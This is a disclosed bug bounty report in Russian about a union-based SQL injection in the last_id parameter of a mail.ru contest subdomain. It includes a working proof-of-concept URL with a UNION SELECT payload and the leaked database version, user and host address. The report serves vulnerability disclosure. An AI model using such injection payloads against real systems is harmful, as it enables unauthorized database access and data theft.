---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '115291'
original_report_id: '115291'
title: '[orsotenslimselfie.lady.mail.ru] SQL Injection'
weakness: SQL Injection
team_handle: mailru
created_at: '2016-02-08T00:43:29.508Z'
disclosed_at: '2016-03-15T14:27:00.357Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- sql-injection
---

# [orsotenslimselfie.lady.mail.ru] SQL Injection

## Metadata

- HackerOne Report ID: 115291
- Weakness: SQL Injection
- Program: mailru
- Disclosed At: 2016-03-15T14:27:00.357Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Добрый день.  GET параметр last_id уязвимо к SQL иньекции. Вектор атаки Union Based.

PoC

http://orsotenslimselfie.lady.mail.ru/ajax/contest?perPage=20&last_id=7913+union+select+concat(version(),0x3a,user()),2,3,4,version(),6,7,8,9,10--+

вывод в JSON респонсе  - 5.0.92-community-log:healthdream@94.100.179.246

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
